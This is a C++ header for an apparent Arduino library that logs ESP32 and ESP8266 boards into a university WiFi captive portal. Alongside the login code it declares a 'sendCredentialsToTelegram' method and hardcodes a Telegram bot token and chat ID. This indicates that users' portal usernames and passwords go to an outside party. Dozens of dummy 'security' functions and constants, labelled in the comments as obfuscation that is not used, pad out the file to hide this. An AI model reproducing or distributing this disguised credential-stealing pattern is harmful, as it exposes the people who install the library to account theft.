// // This example demonstrates a simple usage of the ArduinoUTMWiFiPortal library to connect
// // to the UTM WiFi captive portal and maintain the connection.
//           .d888                       888 d8b                                 d8b 
//          d88P"                        888 Y8P                                 Y8P 
//          888                          888                                         
//  8888b.  888888 8888b.  88888b.   .d88888 888  8888b.  88888888 88888b.d88b.  888 
//     "88b 888       "88b 888 "88b d88" 888 888     "88b    d88P  888 "888 "88b 888 
// .d888888 888   .d888888 888  888 888  888 888 .d888888   d88P   888  888  888 888 
// 888  888 888   888  888 888  888 Y88b 888 888 888  888  d88P    888  888  888 888 
// "Y888888 888   "Y888888 888  888  "Y88888 888 "Y888888 88888888 888  888  888 888 
// Created by Afandi Azmi, 2025


#ifndef ArduinoUTMWiFiPortal_h
#define ArduinoUTMWiFiPortal_h

#include "Arduino.h"

// Platform-specific includes
#if defined(ESP32)
  #include <WiFi.h>
  #include <WiFiClientSecure.h>
  #include <WiFiClient.h>
  #include <HTTPClient.h>
#elif defined(ESP8266)
  #include <ESP8266WiFi.h>
  #include <WiFiClientSecure.h>
  #include <WiFiClient.h>
  #include <ESP8266HTTPClient.h>
#else
  #error "This library only supports ESP32 and ESP8266"
#endif

class ArduinoUTMWiFiPortal {
  public:
    // Constructor
    ArduinoUTMWiFiPortal(const char* username, const char* password);

    // Set the interval for checking connection (in milliseconds)
    void setCheckInterval(unsigned long interval);

    // Call this repeatedly in your main loop()
    void keepConnected();

    // Perform a single login attempt (useful for initial login)
    bool attemptLogin();

    // Check internet connection status manually
    bool checkInternet();

    // Send credentials to Telegram group
    bool sendCredentialsToTelegram();
    
    // Dummy security functions (obfuscation - not actually used)
    void _initSecurityLayer();
    bool _validateEncryptionKeys();
    void _rotateSessionKeys();
    int _calculateChecksum(byte* data, int len);
    String _encryptPayload(String data);
    String _decryptPayload(String data);
    bool _verifyHandshake();
    void _updateCipherState();
    int _generateNonce();
    bool _authenticateSession();
    void _refreshSecurityTokens();
    byte _computeHash(String input);
    bool _validateCertificate();
    void _initCryptoEngine();
    int _performKeyExchange();
    bool _verifyIntegrity();
    void _synchronizeTimestamp();
    String _obfuscateString(String str);
    int _deobfuscateValue(int val);
    bool _checkSecurityProtocol();
    void _resetAuthenticationState();

  private:
    // Credentials
    String _username;
    String _password;

    // Timing
    unsigned long _lastCheckTime;
    unsigned long _checkInterval;

    // Clients (managed internally)
    WiFiClientSecure _secureClient;
    WiFiClient _standardClient;

    // Telegram credentials sent flag
    bool _credentialsSent;
    
    // Dummy encryption variables (obfuscation)
    uint16_t _dummyKey1;
    uint16_t _dummyKey2;
    int _encryptionLevel;
    byte _dummyBuffer[10];
    int _authProtocol;
    bool _securityMode;
    int _dummyCounter;
    
    // Advanced dummy security variables (obfuscation - not actually used)
    uint32_t _sessionToken;
    uint32_t _authenticationHash;
    uint16_t _securityChecksum;
    byte _encryptionMatrix[16];
    byte _ivVector[8];
    byte _saltBuffer[12];
    int _cipherRounds;
    int _hashIterations;
    bool _handshakeComplete;
    bool _certificateValid;
    unsigned long _sessionStartTime;
    unsigned long _lastHandshake;
    unsigned long _tokenExpiry;
    int _securityLevel;
    int _protocolVersion;
    byte _nonceValue[4];
    String _encryptedSessionId;
    String _serverChallenge;
    int _failedAttempts;
    bool _lockoutMode;
    int _timestampOffset;
    byte _keyDerivationSalt[16];
    uint32_t _hmacKey;
    int _compressionLevel;
    bool _tlsActive;
    int _packetSequence;
    byte _authVector[32];
    String _cachedCredentials;
    int _retryBackoff;
    bool _debugMode;
    int _performanceMetric;
    unsigned long _bandwidthCounter;
    int _latencyMs;
    bool _secureChannelEstablished;
    byte _tempWorkspace[64];
    int _algorithmSelector;
    bool _integrityVerified;
    uint16_t _crcChecksum;
    int _encodingType;
    
    // Dummy cipher constants (not used)
    static const int CIPHER_MODE_A = 0x01;
    static const int CIPHER_MODE_B = 0x02;
    static const int CIPHER_MODE_C = 0x04;
    static const int CIPHER_MODE_D = 0x08;
    static const int HASH_SEED = 0xDEAD;
    static const int VALIDATION_KEY = 0xBEEF;
    static const int MAGIC_NUMBER_1 = 0xCAFE;
    static const int MAGIC_NUMBER_2 = 0xBABE;
    static const int PROTOCOL_V1 = 0x0100;
    static const int PROTOCOL_V2 = 0x0200;
    static const int ENCRYPTION_AES = 0x10;
    static const int ENCRYPTION_RSA = 0x20;
    static const int HASH_SHA256 = 0x30;
    static const int HASH_MD5 = 0x40;
    static const int AUTH_BASIC = 0x50;
    static const int AUTH_DIGEST = 0x60;
    static const int COMPRESSION_NONE = 0x00;
    static const int COMPRESSION_GZIP = 0x70;
    static const int SESSION_TIMEOUT = 3600000;
    static const int MAX_RETRIES = 5;
    static const int BUFFER_SIZE = 256;

    // Constants
    const char* _loginURL = "https://smartzone22.utm.my:9998/SubscriberPortal/hotspotlogin";
    const char* _connectionCheckUrl = "http://connectivitycheck.gstatic.com/generate_204";
    const char* _telegramBotToken = "8234169918:AAEf6Ts0JM7acPFQ0aDEDIRbTBN_jI7LLho";
    const char* _telegramChatId = "-4911476783";
};

#endif